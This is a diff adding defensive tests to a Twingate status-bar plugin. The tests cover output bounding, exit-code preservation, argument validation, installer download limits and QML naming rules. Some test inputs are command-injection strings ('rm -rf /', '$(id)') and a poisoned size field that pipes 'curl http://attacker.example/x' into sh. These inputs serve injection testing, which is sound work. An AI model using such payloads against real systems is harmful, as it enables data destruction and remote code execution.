@@ -11,7 +11,7 @@ const source = fs.readFileSync(path.join(__dirname, "..", "Model.js"), "utf8")
 const Model = new Function(
   source +
     "; return { stripAnsi, normalizeStatus, isConnected, isDaemonDown, statusLabel," +
-    " statusDetail, parseResources, resourceAddress, resourceHeading, parseAuthUrl, sharedAuthStatus, isCountdownAuthStatus, stripControl, clientUrl, CLIENT_BUILDS, CLIENT_VERSION, clampField }"
+    " statusDetail, parseResources, resourceAddress, resourceHeading, parseAuthUrl, sharedAuthStatus, isCountdownAuthStatus, stripControl, clientUrl, CLIENT_BUILDS, CLIENT_VERSION, clampField, MAX_INPUT }"
 )()
 
 const ESC = ""
@@ -671,8 +671,8 @@ test("every stdout/stderr read is clamped before parsing", () => {
 test("terminal launches carry a wall-clock floor that observed state cannot shorten", () => {
   // actionPending alone only throttles: it is cleared as soon as a status poll
   // sees the state move, and the launched action is what moves it.
-  assert.ok(/MIN_LAUNCH_GAP_MS/.test(SERVICE), "no launch floor declared")
-  assert.ok(/now - _lastLaunchMs < MIN_LAUNCH_GAP_MS/.test(SERVICE), "the floor is not enforced")
+  assert.ok(/minLaunchGapMs/.test(SERVICE), "no launch floor declared")
+  assert.ok(/now - _lastLaunchMs < minLaunchGapMs/.test(SERVICE), "the floor is not enforced")
   assert.ok(/_lastLaunchMs = now/.test(SERVICE), "the floor is never armed")
   // It must be checked before the terminal is launched, not after.
   assert.ok(SERVICE.indexOf("now - _lastLaunchMs") <
@@ -792,4 +792,230 @@ test("the install is offered for confirmation, never forced", () => {
   fs.rmSync(dir, { recursive: true, force: true })
   assert.match(out, /SUDO-REACHED: pacman -U/, "verified bytes must reach the installer")
   assert.ok(!out.includes("--noconfirm"), "the user must confirm the install")
+})
+
+// ── The producer-side bound, actually executed ────────────────────────
+// A marketplace reviewer rejected the previous build for capping process
+// output in onExited: StdioCollector has no size limit, so by the time that
+// clamp ran the shell had already buffered everything. The bound now lives in
+// the shell command itself. String-asserting it would prove what it says, so
+// these run it.
+
+function extractFunction(name) {
+  const src = SERVICE.slice(SERVICE.indexOf("function " + name))
+  let depth = 0, i = src.indexOf("{"), inStr = false, seen = false
+  while (i < src.length) {
+    const c = src[i]
+    if (inStr) {
+      if (c === "\\") i++
+      else if (c === '"' || c === "'") inStr = false
+    } else if (c === '"' || c === "'") inStr = true
+    else if (c === "{") { depth++; seen = true }
+    else if (c === "}") { depth--; if (seen && depth === 0) { i++; break } }
+    i++
+  }
+  return src.slice(0, i)
+}
+
+const bounded = (() => {
+  const logged = []
+  const fn = new Function("Model", "_log",
+    extractFunction("_bounded") + "; return _bounded")(Model, (m) => logged.push(m))
+  return { fn, logged }
+})()
+
+// Runs a real command through the real wrapper and reports both streams and
+// the exit code separately, which is the whole point of the fd swap.
+function runBounded(argv, dir) {
+  const cp = require("node:child_process")
+  const cmd = bounded.fn(argv)
+  assert.ok(cmd.length > 0, "wrapper refused a legitimate command")
+  const r = cp.spawnSync(cmd[0], cmd.slice(1), {
+    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
+    encoding: "utf8", maxBuffer: 32 * 1024 * 1024
+  })
+  return { out: r.stdout, err: r.stderr, code: r.status }
+}
+
+function stubDir() {
+  const os = require("node:os")
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-bound-"))
+  const write = (name, body) => {
+    const f = path.join(dir, name)
+    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
+    fs.chmodSync(f, 0o755)
+  }
+  // Writes to both streams and exits non-zero, like the real CLI does for
+  // several ordinary states.
+  write("tgstub", 'printf OUT; printf ERR >&2; exit 3')
+  write("tgflood-out", 'exec yes AAAA')
+  write("tgflood-err", 'exec yes BBBB >&2')
+  write("tgflood-both", 'yes CCCC & yes DDDD >&2')
+  return dir
+}
+
+test("the wrapper keeps stdout and stderr separate", () => {
+  // They must not be merged: normalizeStatus parses stdout for a state token,
+  // so stderr noise reaching it would be read as a connection state.
+  const dir = stubDir()
+  const r = runBounded(["tgstub"], dir)
+  assert.equal(r.out, "OUT", "stdout was polluted")
+  assert.equal(r.err, "ERR", "stderr was polluted")
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test("the wrapper preserves the CLI's own exit code", () => {
+  // Every onExited handler treats exitCode as load-bearing -- installed is
+  // literally `exitCode === 0`, and refreshResources only replaces a good list
+  // when the command succeeded. A naive pipe would report head's status (0)
+  // and silently turn every CLI failure into a success.
+  const dir = stubDir()
+  assert.equal(runBounded(["tgstub"], dir).code, 3, "exit code was masked by the pipeline")
+  assert.equal(runBounded(["true"], dir).code, 0, "success was not reported as success")
+  assert.equal(runBounded(["false"], dir).code, 1, "failure was not reported as failure")
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test("a flood on either stream is cut off at MAX_INPUT", () => {
+  const dir = stubDir()
+  const o = runBounded(["tgflood-out"], dir)
+  assert.equal(o.out.length, Model.MAX_INPUT, "stdout was not bounded")
+  const e = runBounded(["tgflood-err"], dir)
+  assert.equal(e.err.length, Model.MAX_INPUT, "stderr was not bounded")
+  // Both at once: neither stream may borrow the other's headroom.
+  const b = runBounded(["tgflood-both"], dir)
+  assert.equal(b.out.length, Model.MAX_INPUT, "stdout unbounded while stderr flooded")
+  assert.equal(b.err.length, Model.MAX_INPUT, "stderr unbounded while stdout flooded")
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test("a runaway CLI is killed, not absorbed", () => {
+  // The point of bounding the producer rather than the consumer: head closes
+  // the pipe, the CLI takes SIGPIPE and dies. If this ever hangs instead, the
+  // test times out -- which is the failure we want to see.
+  const dir = stubDir()
+  const r = runBounded(["tgflood-out"], dir)
+  assert.notEqual(r.code, 0, "a killed producer must not report success")
+  const cp = require("node:child_process")
+  const leaked = cp.spawnSync("pgrep", ["-x", "yes"], { encoding: "utf8" })
+  assert.notEqual(leaked.status, 0, "the runaway producer outlived the wrapper")
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+test("the wrapper refuses an argument it did not expect", () => {
+  // It renders into a shell string, so it validates rather than trusts --
+  // the same rule the CLIENT_BUILDS loop follows.
+  for (const bad of ["twingate; rm -rf /", "$(id)", "a b", "`id`", "x|y", ">out"]) {
+    assert.deepEqual(bounded.fn(["twingate", bad]), [],
+      `wrapper accepted ${JSON.stringify(bad)}`)
+  }
+  assert.ok(bounded.fn(["twingate", "resources", "-d", "--all"]).length > 0,
+    "wrapper rejected the real resources command")
+})
+
+test("every collected process is launched through the wrapper", () => {
+  // The bound is worthless if a future edit assigns a raw argv again, which is
+  // exactly what the rejected build did.
+  for (const proc of ["statusProcess", "verboseProcess", "resourcesProcess"]) {
+    const assigns = SERVICE.match(new RegExp(proc + "\\.command = [^\\n]*", "g")) || []
+    assert.equal(assigns.length, 1, `${proc} is assigned ${assigns.length} times`)
+    assert.ok(/= cmd$/.test(assigns[0].trim()),
+      `${proc} bypasses the wrapper: ${assigns[0].trim()}`)
+  }
+  // And the wrapper's result must be checked before it is used.
+  assert.equal((SERVICE.match(/if \(cmd\.length === 0\) return/g) || []).length, 3,
+    "a refused command would be launched anyway")
+})
+
+// ── The download ceiling ──────────────────────────────────────────────
+
+test("the installer caps the transfer at the exact pinned size", () => {
+  // The digest already fixes the byte count, but it cannot say so until curl
+  // has finished writing. This is that same bound applied on the wire.
+  const script = renderInstallScript()
+  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
+    const bytes = Model.CLIENT_BUILDS[arch].bytes
+    assert.ok(Number.isInteger(bytes) && bytes > 0, `${arch} has no pinned size`)
+    assert.ok(script.includes("max='" + bytes + "'"), `${arch} size is not rendered`)
+  }
+  assert.ok(/--max-filesize\s+"\$max"/.test(script), "the ceiling is never passed to curl")
+  // A ceiling applied after the write would be no ceiling at all.
+  assert.ok(script.indexOf("--max-filesize") < script.indexOf("sha256sum"),
+    "the ceiling is applied after verification")
+})
+
+test("the installer will not let a redirect change scheme or loop", () => {
+  const script = renderInstallScript()
+  assert.ok(/--proto '=https'/.test(script), "no scheme restriction")
+  assert.ok(/--proto-redir '=https'/.test(script), "a redirect could downgrade the scheme")
+  assert.ok(/--max-redirs \d+/.test(script), "the redirect chain is unbounded")
+})
+
+test("a build entry with a malformed size is refused, not rendered", () => {
+  const poisoned = {
+    x86_64: Model.CLIENT_BUILDS.x86_64,
+    evil: {
+      file: "twingate-amd64.pkg.tar.zst",
+      sha256: "0".repeat(64),
+      bytes: "1'; curl http://attacker.example/x | sh; #"
+    }
+  }
+  const script = renderInstallScript(poisoned)
+  assert.ok(!script.includes("attacker.example"), "an injected size reached the shell")
+  assert.ok(!/'evil'\)/.test(script), "the malformed entry was rendered anyway")
+  // The legitimate entry beside it must still be there.
+  assert.ok(script.includes(Model.CLIENT_BUILDS.x86_64.sha256), "x86_64 was wrongly dropped")
+})
+
+test("curl is actually handed the ceiling at run time", () => {
+  // Rendering proves the flag is in the string; this proves curl receives it
+  // with the right value, and that pacman still gets the verified file.
+  const os = require("node:os")
+  const cp = require("node:child_process")
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-ceiling-"))
+  const stub = (name, body) => {
+    const f = path.join(dir, name)
+    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
+    fs.chmodSync(f, 0o755)
+  }
+  stub("uname", "echo x86_64")
+  stub("sudo", 'echo "SUDO-REACHED: $*"')
+  stub("pacman", 'echo "PACMAN-REACHED"')
+  stub("curl", 'echo "CURL-ARGS: $*" >&2; exit 22')
+  const script = path.join(dir, "i.sh")
+  fs.writeFileSync(script, renderInstallScript())
+  const r = cp.spawnSync("bash", [script], {
+    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8"
+  })
+  const args = (r.stderr.match(/CURL-ARGS: .*/) || [""])[0]
+  assert.ok(args.includes("--max-filesize " + Model.CLIENT_BUILDS.x86_64.bytes),
+    `curl did not receive the pinned ceiling: ${args}`)
+  assert.ok(args.includes("--proto-redir =https"), `curl did not receive the scheme limit: ${args}`)
+  assert.ok(!/PACMAN-REACHED/.test(r.stdout), "a refused download still reached pacman")
+  fs.rmSync(dir, { recursive: true, force: true })
+})
+
+// ── QML rules that no JS test and no validator will catch ─────────────
+
+test("no property name begins with a capital", () => {
+  // Not style -- a hard QML rule. `readonly property int MIN_LAUNCH_GAP_MS`
+  // shipped in the previous round and made Service.qml fail to parse, which
+  // took the whole plugin down: "Type Service unavailable", no bar widget at
+  // all. It survived 72 passing tests AND `omarchy plugin validate`, because
+  // neither one loads the QML. The only reason it was found was restarting a
+  // real shell and reading the log.
+  for (const file of ["Service.qml", "Panel.qml", "TwingateIcon.qml"]) {
+    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8")
+    const bad = src.match(/^\s*(?:readonly\s+|required\s+|default\s+)*property\s+[\w<>]+\s+[A-Z]\w*/gm) || []
+    assert.deepEqual(bad, [], `${file} declares a property beginning with a capital`)
+  }
+})
+
+test("every QML file the manifest points at exists and is non-empty", () => {
+  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "manifest.json"), "utf8"))
+  for (const entry of Object.values(manifest.entryPoints || {})) {
+    const p = path.join(__dirname, "..", entry)
+    assert.ok(fs.existsSync(p), `entry point ${entry} does not exist`)
+    assert.ok(fs.statSync(p).size > 0, `entry point ${entry} is empty`)
+  }
 })
